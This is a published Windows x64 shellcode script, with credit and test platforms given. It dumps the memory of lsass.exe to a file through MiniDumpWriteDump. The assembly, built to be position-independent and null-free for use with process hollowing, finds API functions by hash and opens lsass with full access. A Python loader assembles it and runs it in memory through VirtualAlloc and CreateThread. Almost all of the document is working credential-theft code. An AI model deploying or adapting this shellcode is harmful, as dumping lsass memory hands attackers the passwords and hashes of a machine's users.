# Shellcode Title: Windows/x64 Dump lsass.exe using MiniDumpWriteDump (613 bytes)
# Author: Lasse H. Jensen (0xFenrik)
# Date: 9/9/2021
# Tested on: Windows 10 v19042 (x64), Windows Server 2016 (x64)
# Description: 
#   x64 bit shellcode that basically mimics the c++ code from ired.team (https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass) 
#   The code was made to be used in combination with hollowing-techniques. 
#   The shellcode is position-independent (PIC) and does not contain nullbytes. It does not utilize the Win32 API: GetProcAddress, 
#   but instead relies solely on finding functions (symbols) from the DLL Export Table Directory. 


import ctypes, struct
from keystone import *

CODE = (
"   setup:                              "
"       mov rbp, rsp                    ;" # Save rsp
"       xor rax, rax                    ;" 
"       mov eax, 0xfffffcff             ;" # Move rsp 0x300 bytes to make room for variables and structures
"       inc eax                         ;" 
"       neg eax                         ;"
"       sub rsp, rax                    ;"

"   kernel32_baseadddress:               "
"       xor rcx, rcx                    ;"
"       mov rsi, gs:[rcx+0x60]          ;" # RSI = _PEB
"       mov rsi, [rsi+0x18]             ;" # RSI = PEB->Ldr
"       mov rsi, [rsi+0x30]             ;" # RSI = PEB->Ldr.InInitOrder
"       mov rsi, [rsi]                  ;" # RSI = InInitOrder[X].flink (next) (ntdll.dll)
"       mov rsi, [rsi]                  ;" # RSI = InInitOrder[X].flink (next) (kernel32.dll)
"       mov r12, [rsi+0x10]             ;" # r12 = InInitOrder[X].base_address
"       jmp resolve_symbols_kernel32    ;" # Start resolving symbol names from kernel32.dll

"   find_function:                      "
"       pop r14                         ;" # Return address to continue resolve_symbols_kernel32
"       xor rax, rax                    ;" # Make sure register are zero
"       xor rdi, rdi                    ;" # Make sure register are zero 
"       xor rbx, rbx                    ;" # Make sure register are zero 
"       mov eax, [r12+0x3c]             ;" # Offset to PE Signature (the value at 0x3c is a dword, so we use eax)
"       mov edi, 0xffffff78             ;" # offset 0x88 has to be negated due to nullbytes
"       neg edi                         ;"
"       add eax, edi                    ;" # Add 0x88 to eax
"       mov edi, [r12+rax]              ;" # EDI = Export Table Directory RVA ; e_lfanew = 0x18;  DataDirectory offset 0x70 
"       add rdi, r12                    ;" # RDI = Export Table Directory VMA
"       mov ecx, [rdi+0x18]             ;" # NumberOfNames
"       mov ebx, [rdi+0x20]             ;" # AddressOfNames RVA
"       mov r8, r12                     ;" 
"       add r8, rbx                     ;" # AddressOfNames VMA

"   find_function_loop:                 "
"       jecxz find_function_finished    ;" # Jump to the end if ECX is 0
"       dec ecx                         ;" # Decrement our names counter
"       mov esi, [r8+rcx*4]             ;" # Get the RVA of the symbol name
"       add rsi, r12                    ;" # Set RSI to the VMA of the current symbol name

"   prepare_hashing_algorithm:           "
"       xor rax, rax                    ;" # Null the RAX register
"       cdq                             ;" # Set EDX to the value of EAX (null)
"       cld                             ;" # Clear the direction flag (DF)

"   compute_hash:                        "
"       lodsb                           ;"  # Load the next byte from esi into al
"       test al, al                     ;"  # Check for NULL terminator
"       jz find_function_compare        ;"  # IF the ZF is set, we've hit the null
"       ror edx, 0x0d                   ;"  # Rotate edx 13 bits to the right
"       add edx, eax                    ;"  # add the new byte to the accumulator (EDX)
"       jmp compute_hash                ;"  # Next iteration

"   find_function_compare:               "
"       cmp edx, r15d                   ;"  # Compare the computed hash with the requested hash
"       jnz find_function_loop          ;"  # If it doesn't match go back to find_function_loop
"       mov edx, [rdi+0x24]             ;"  # AddressOfNamesOrdinals RVA
"       add rdx, r12                    ;"  # AddressOfNamesOrdinals VMA
"       mov cx, [rdx+2*rcx]             ;"  # Get the value of the AddressOfNamesOrdinals
"       mov edx, [rdi+0x1c]             ;"  # AddressOfFunctions RVA
"       add rdx, r12                    ;"  # AddressOfFunctions VMA
"       mov eax, [rdx+4*rcx]            ;"  # The Function RVA
"       add rax, r12                    ;"  # The function VMA

"   find_function_finished:             "
"       push r14                        ;" # return correctly to callee
"       ret                             ;"

"   resolve_symbols_kernel32:           "
"       mov r15d, 0x73e2d87e            ;" # ExitProcess hash
"       call find_function              ;" # Call find_function
"       mov [rbp+0x10], rax             ;" # Save ExitProcess address for later usage
"       mov r15d, 0xec0e4e8e            ;" # LoadLibraryA hash
"       call find_function              ;" # Call find_function
"       mov [rbp+0x18], rax             ;" # Save LoadLibrary address for later usage
"       mov r15d, 0xe454dfed            ;" # CreateToolhelp32Snapshot hash
"       call find_function              ;" # Call find_function
"       mov [rbp+0x20], rax             ;" # Save address for later usage
"       mov r15d, 0x4776654a            ;" # Process32Next hash
"       call find_function              ;" # Call find_function
"       mov [rbp+0x28], rax             ;" # Save address for later usage
"       mov eax, 0x83ffe85b             ;" # Negated hash for CreateFileA due to null byte (0x7c0017a5)
"       neg eax                         ;" # Negate back
"       mov r15d, eax                   ;" # CreateFileA hash
"       call find_function              ;" # Call find_function
"       mov [rbp+0x30], rax             ;" # Save address for later usage
"       mov r15d, 0xefe297c0            ;" # OpenProcess hash
"       call find_function              ;" # Call find_function
"       mov [rbp+0x38], rax             ;" # Save address for later usage

#   HMODULE LoadLibraryA(
#       LPCSTR lpLibFileName => RCX = Pointer to string of filename
#   );

"   load_Dbgcore:                       "
"       xor eax, eax                    ;"
"       push rax                        ;" # 
"       mov eax, 0xff93939c             ;" # dll                                  
"       neg eax                         ;" # Avoiding null bytes
"       push rax                        ;"
"       mov rax, 0x2e65726f63676264     ;" # dbgcore.
"       push rax                        ;" 
"       lea rcx, [rsp]                  ;" # Pointer to string: dbgcore.dll
"       sub rsp, 0x40                   ;" # Allocate stack space for function call
"       call qword ptr [rbp+0x18]       ;" # Call LoadLibrary
"       add rsp, 0x40                   ;" # Cleanup allocated stack space

"   resolve_symbols_Dbgcore:             "
"       mov r12, rax                    ;"  # Move the base address of Dbgcore.dll to R12
"       mov r15d, 0x79ceb893            ;"  # MiniDumpWriteDump hash
"       call find_function              ;" # Call find_function
"       mov [rbp+0x40], rax             ;"  # Save address for later usage

#   HANDLE CreateToolhelp32Snapshot(
#       DWORD dwFlags       => RCX = TH32CS_SNAPPROCESS (0x2)
#       DWORD th32ProcessID => RDX = 0x0
#   );

"   call_CreateToolhelp32Snapshot:       "
"       xor rdx, rdx                    ;" # th32ProcessID (zero)
"       mov rcx, rdx                    ;" 
"       inc rcx                         ;"
"       inc rcx                         ;" # dwFlags (0x2 = TH32CS_SNAPPROCESS) 
"       sub rsp, 0x40                   ;" # Allocate stack space for function call
"       call qword ptr [rbp+0x20]       ;" # Call CreateToolhelp32Snapshot 
"       add rsp, 0x40                   ;" # Cleanup allocated stack space
"       mov r13, rax                    ;" # Store handle for later

# For more information on the ProcessEntry32 Struct: 
# (https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32)

"   create_processentry32:               "
"       mov rax, 0xfffffffffffffdc8     ;" # dwSize (568 on 0x64 according to visualstudio)
"       neg rax                         ;" # NEG EAX
"       push rax                        ;"
"       xor rax, rax                    ;" # clean rax
"       mov [rsp+0x4], eax              ;" # dwFlags
"       mov [rsp+0x8], eax              ;" # pcPriClassBase
"       mov [rsp+0x0c], eax             ;" # th32ParentProcessID
"       mov [rsp+0x10], eax             ;" # cntThreads
"       mov [rsp+0x14], eax             ;" # th32ModuleID
"       mov [rsp+0x18], rax             ;" # th32DefaultHeapID //8 bytes
"       mov [rsp+0x20], eax             ;" # th32ProcessID
"       mov [rsp+0x24], eax             ;" # cntUsage
"       mov r14, rsp                    ;" # Save for later

"   find_process:                        " # Put lsass.exe on the stack:
"       mov eax, 0xffffff9b             ;" # e + null byte
"       neg eax                         ;"
"       push rax                        ;"
"       mov rax, 0x78652e737361736c     ;" # lsass.ex
"       push rax                        ;"
"       mov r15, rsp                    ;" # Store pointer for string for later
"       xor rax, rax                    ;" # Prepare rax for loop
"       inc rax                         ;" # Prepare for loop
"       cld                             ;" # Clear direction flag
"       jmp compare_process             ;"

#   BOOL Process32Next(
#       HANDLE           hSnapshot => RCX = handle to snapshot (from CreateToolhelp32Snapshot)
#       LPPROCESSENTRY32 lppe => RDX = Pointer to Process32Entry struct
#   );

"   call_Process32Next:                  " # 
"       sub rsp, 0x40                   ;" # Allocate 40 bytes on the stack
"       mov rcx, r13                    ;" # The handle from CreateToolhelp32Snapshot
"       mov rdx, r14                    ;" # Pointer to Process32Entry structure
"       call qword ptr [rbp+0x28]       ;" # Call Process32Next 
"       lea rdi, [r14+0x2c]             ;" # The processName of the next process
"       add rsp, 0x40                   ;" # Clean up stack

"   is_match:                           "
"       xor rcx, rcx                    ;" # Zero out rcx 
"       mov cl, 0x9                     ;" # Length of lsass.exe (0x9)
"       mov rsi, r15                    ;" # Pointer to string of lsass.exe
"       repe cmpsb                      ;" # Compare edi to esi
"       jnz compare_process             ;"
"       mov r12, [r14+0x8]              ;" # The pid of lsass.exe
"       jmp Call_OpenProcess            ;"

"   compare_process:                    "
"       test eax, eax                   ;" # See if we have made it to the end of the list, if not call process32Next
"       jnz call_Process32Next          ;"

#   HANDLE OpenProcess(
#       DWORD dwDesiredAccess => RCX =  GENERIC_ALL_ACCESS (0x001f0fff)
#       BOOL  bInheritHandle  => RDX = 0x0
#       DWORD dwProcessId     => R8 = lsass.exe pid
#   );

"   Call_OpenProcess:                    "
"       sub rsp, 0x40                   ;" # Allocate 40 bytes on the stack
"       mov ecx, 0xffe0f001             ;" # dwDesiredAccess: GENERIC_ALL_ACCESS 
"       neg ecx                         ;" 
"       xor rdx, rdx                    ;" # bInheritHandle (0x0)
"       mov r8, r12                     ;" # dwProcessId (Lsass pid)
"       call qword ptr [rbp+0x38]       ;" # Call OpenProcess
"       add rsp, 0x40                   ;" # Clean up stack
"       mov r13, rax                    ;" # save for later

#   HANDLE CreateFileA(
#       LPCSTR                lpFileName            => RCX = Pointer to string of filename
#       DWORD                 dwDesiredAccess       => RDX = 0x10000000
#       DWORD                 dwShareMode           => R8 = 0x0
#       LPSECURITY_ATTRIBUTES lpSecurityAttributes  => R9 = 0x0
#       DWORD                 dwCreationDisposition => [rsp + 0x20] = 0x2
#       DWORD                 dwFlagsAndAttributes  => [rsp + 0x28] = 0x80
#       HANDLE                hTemplateFile         => [rsp + 0x30] = 0x0
#   );

"   Call_CreateFileA:                    "
"       xor rax, rax                    ;"
"       push rax                        ;"
"       mov eax, 0xffffff90             ;" # p + null byte
"       neg eax                         ;"
"       push rax                        ;"
"       mov rax, 0x6d642e737361736c     ;" # lsass.dm
"       push rax                        ;"
"       mov rcx, rsp                    ;" # Store pointer for string for later
"       sub rsp, 0x40                   ;" # Setup stack
"       xor rax, rax                    ;" # Zero out rax
"       mov al, 0x10                    ;"
"       shl eax, 0x18                   ;" # dwDesiredAccess set to GENERIC_ALL (0x10000000)
"       mov rdx, rax                    ;"
"       xor r8, r8                      ;" # dwShareMode
"       xor r9, r9                      ;" # lpSecurityAttributes
"       xor rax, rax                    ;"
"       inc rax                         ;"
"       inc rax                         ;"
"       mov [rsp+0x20], rax             ;" # dwCreationDisposition set to (0x2)
"       xor rax, rax                    ;" 
"       mov al, 0x80                    ;" # dwFlagsAndAttributes set to FILE_ATTRIBUTE_NORMAL (0x80)
"       mov [rsp+0x28], rax             ;"
"       xor rax, rax                    ;"
"       mov [rsp+0x30], rax             ;" # hTemplateFile set to zero (0x0)
"       call qword ptr [rbp+0x30]       ;"
"       mov r14, rax                    ;" # Save handle for later
"       add rsp, 0x40                   ;" # Restore stack

#   BOOL MiniDumpWriteDump(
#       HANDLE                            hProcess        => RCX = lsass.exe handle
#       DWORD                             ProcessId       => RDX = lsass.exe pid
#       HANDLE                            hFile           => R8 = lsass.dmp handle (output file)
#       MINIDUMP_TYPE                     DumpType        => R9 = 0x2
#       PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam  => [rsp+0x20] = 0x0
#       PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam => [rsp+0x28] = 0x0
#       PMINIDUMP_CALLBACK_INFORMATION    CallbackParam   => [rsp+0x30] = 0x0
#   );

"   Call_MiniDumpWriteDump:              "
"       sub rsp, 0x40                   ;" # Setup stack
"       mov rcx, r13                    ;" # hProcess (lsass.exe handle)
"       mov rdx, r12                    ;" # ProcessId (lsass.exe pid)
"       mov r8, r14                     ;" # hFile (output file handle (lsass.dmp))
"       xor r9, r9                      ;" # DumpType 
"       mov [rsp+0x20], r9              ;" # ExceptionParam 0x0
"       mov [rsp+0x28], r9              ;" # UserStreamParam 0x0
"       mov [rsp+0x30], r9              ;" # CallbackParam 0x0
"       inc r9                          ;" # DumpType set to 0x2
"       inc r9                          ;"
"       call qword ptr [rbp+0x40]       ;"
"       add rsp, 0x40                   ;" # Restore stack

#   void ExitProcess(
#       UINT uExitCode  =>  RCX = 0
#   );

"   call_ExitProcess:                   "
"       xor ecx, ecx                    ;"
"       call qword ptr [rbp+0x10]       ;" # Call ExitProcess

)


# Initialize engine in X86-64bit mode
try:
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    encoding, count = ks.asm(CODE)
    print("Encoded %d instructions..." % count)

    opcodes = ""
    for dec in encoding:
        opcodes += "\\x{0:02x}".format(int(dec)).rstrip("\n")
    print("size: %d " % len(encoding))
    print("payload = (\"" + opcodes + "\")")

    sh = b""
    for e in encoding:
        sh += struct.pack("B", e)
    shellcode = bytearray(sh)

    # to be used to inject the shellcode into memory for debugging
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlCopyMemory.argtypes = ( ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t ) 
    ctypes.windll.kernel32.CreateThread.argtypes = ( ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int) ) 

    space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buff = ( ctypes.c_char * len(shellcode) ).from_buffer_copy( shellcode )
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(shellcode)))

    input("...ENTER TO EXECUTE SHELLCODE...") 

    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))

    ctypes.windll.kernel32.WaitForSingleObject(handle, -1);
    

except KsError as e:
    print("ERROR: %s" %e)
